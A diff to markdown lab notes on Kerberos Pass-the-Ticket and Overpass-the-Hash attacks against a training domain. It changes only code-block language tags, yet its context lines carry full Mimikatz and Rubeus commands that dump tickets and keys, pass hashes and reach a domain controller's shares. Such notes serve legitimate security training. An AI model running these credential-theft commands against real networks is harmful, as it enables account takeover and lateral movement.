@@ -23,7 +23,7 @@ Simply put, Kerberos is an authentication system that works with the concept of 
 
 ### Method 1: Mimikatz **sekurlsa::tickets** module
 
-```cmd-session
+```batch
 c:\tools> mimikatz.exe
 
 <SNIP>
@@ -43,7 +43,7 @@ This will print out the result and saves it to files with a **.kirbi** extension
 
 While the tickets that end with `$` correspond to the computer account.
 
-```cmd-session
+```batch
 c:\tools> dir *.kirbi
 
 Directory: c:\tools
@@ -63,7 +63,7 @@ Mode                LastWriteTime         Length Name
 
 This method outputs the tickets with base64 encoding, we'll use /nowrap\` for easier copy/paste.
 
-```cmd-session
+```batch
 c:\tools> Rubeus.exe dump /nowrap
 ```
 
@@ -77,7 +77,7 @@ While the traditional Pass the Hash technique doesn't involve Kerberos, but inst
 
 ### Step1: Dump all user's Kerberos encryption keys with Mimikatz **sekurlsa::ekeys** module
 
-```cmd-session
+```batch
 c:\tools> mimikatz.exe
 
 mimikatz # privilege::debug
@@ -113,7 +113,7 @@ SID               : S-1-5-21-228825152-3134732153-3833540767-1107
 
 #### Method 1: Mimikatz + local admin privileges
 
-```cmd-session
+```batch
 mimikatz # sekurlsa::pth /domain:inlanefreight.htb /user:plaintext /ntlm:3f74aa8f08f712f09cd5177b5c1ce50f
 ```
 
@@ -121,7 +121,7 @@ This will spawn another cmd.exe window in which we can request anything in the c
 
 #### Method2: Rubeus with non-admin user
 
-```cmd-session
+```batch
 c:\tools> Rubeus.exe  asktgt /domain:inlanefreight.htb /user:plaintext /aes256:b21c99fc068e3ab2ca789bccbef67de43791fd911c6e15ead25641a8fda3fe60 /nowrap
 
    ______        _
@@ -164,7 +164,7 @@ At this point we need ===Valid Kerberos Tickets=== either we dumped them like we
 
 The idea is the import the ticket in current session. Upon success, it'll print ==Ticket successfully imported==.
 
-```cmd-session
+```batch
 c:\tools> Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /rc4:3f74aa8f08f712f09cd5177b5c1ce50f /ptt
    ______        _
   (_____ \      | |
@@ -199,7 +199,7 @@ c:\tools> Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /rc4:3f74a
 
 ### Method 2: Rubeus + .kirbi file obtained from Mimikatz
 
-```cmd-session
+```batch
 c:\tools> Rubeus.exe ptt /ticket:[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi
 
  ______        _
@@ -230,13 +230,13 @@ d-----         6/4/2022  11:17 AM                Program Files (x86)
 
 We can also use the base64-encoded ticket obtained from Rubeus or base664 encode the Mimikatz tickets using :
 
-```powershell-session
+```powershell
 PS c:\tools> [Convert]::ToBase64String([IO.File]::ReadAllBytes("[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"))
 ```
 
 And then use Rubeus:
 
-```cmd-session
+```batch
 c:\tools> Rubeus.exe ptt /ticket:doIE1jCCBNKg...<SNIP>...
  ______        _
 (_____ \      | |
@@ -254,7 +254,7 @@ v1.5.0
 
 Which grants us access as the target user:
 
-```powershell-session
+```batch
 c:\tools> dir \\DC01.inlanefreight.htb\c$
 Directory: \\dc01.inlanefreight.htb\c$
 
@@ -268,7 +268,7 @@ d-----         6/4/2022  11:17 AM                Program Files (x86)
 
 ### Method 4: Mimikatz
 
-```cmd-session
+```batch
 C:\tools> mimikatz.exe 
 
   .#####.   mimikatz 2.2.0 (x64) #19041 Aug  6 2020 14:53:43
@@ -290,7 +290,7 @@ Bye!
 
 Which grants us access to whatever the target user has access to:
 
-```powershell-session
+```batch
 c:\tools> dir \\DC01.inlanefreight.htb\c$
 Directory: \\dc01.inlanefreight.htb\c$
 
@@ -310,7 +310,7 @@ To create a PowerShell Remoting session on a remote computer, you must have admi
 
 ### 5.1 Using Mimikatz (Local Admin required)
 
-```cmd-session
+```batch
 C:\tools> mimikatz.exe
 
   .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
@@ -333,7 +333,7 @@ Bye!
 
 Now we can spawn a PS session in the target host:
 
-```cmd-session
+```powershell
 c:\tools>powershell
 Windows PowerShell
 Copyright (C) 2015 Microsoft Corporation. All rights reserved.
@@ -354,7 +354,7 @@ Rubeus has the option `createnetonly`, which creates a sacrificial process/logon
 
 #### Step 1: Create a Sacrificial Process
 
-```cmd-session
+```batch
 C:\tools> Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show
    ______        _
   (_____ \      | |
@@ -382,7 +382,7 @@ C:\tools> Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show
 
 That will spawn a new cmd window through which we can request a new TGT with `/ptt` using `Rubeus`, import it to our new session and then connect to that target DC using PSRemoting.
 
-```cmd-session
+```batch
 C:\tools> Rubeus.exe asktgt /user:john /domain:inlanefreight.htb /aes256:9279bcbd40db957a0ed0d3856b2e67f9bb58e6dc7fc07207d0763ce2713f11dc /ptt
    ______        _
   (_____ \      | |
@@ -443,7 +443,7 @@ C:\tools> Rubeus.exe asktgt /user:john /domain:inlanefreight.htb /aes256:9279bcb
 
 With the ticket successfully imported:
 
-```cmd-session
+```batch
 c:\tools>powershell
 Windows PowerShell
 Copyright (C) 2015 Microsoft Corporation. All rights reserved.
@@ -461,13 +461,13 @@ DC01
 
 #### Step 1: Harvest Kerberos tickets from current session:
 
-```cmd-session
+```batch
 c:\tools> Rubeus.exe dump /nowrap
 ```
 
 #### Step 2:
 
-```cmd-session
+```batch
 c:\tools> Rubeus.exe ptt /ticket:doIE1jCCBNKg...<SNIP>...
  ______        _
 (_____ \      | |
@@ -485,7 +485,7 @@ v1.5.0
 
 Which grants us access as the target user:
 
-```cmd-session
+```batch
 c:\tools> dir \\DC01.inlanefreight.htb\c$
 Directory: \\dc01.inlanefreight.htb\c$
 
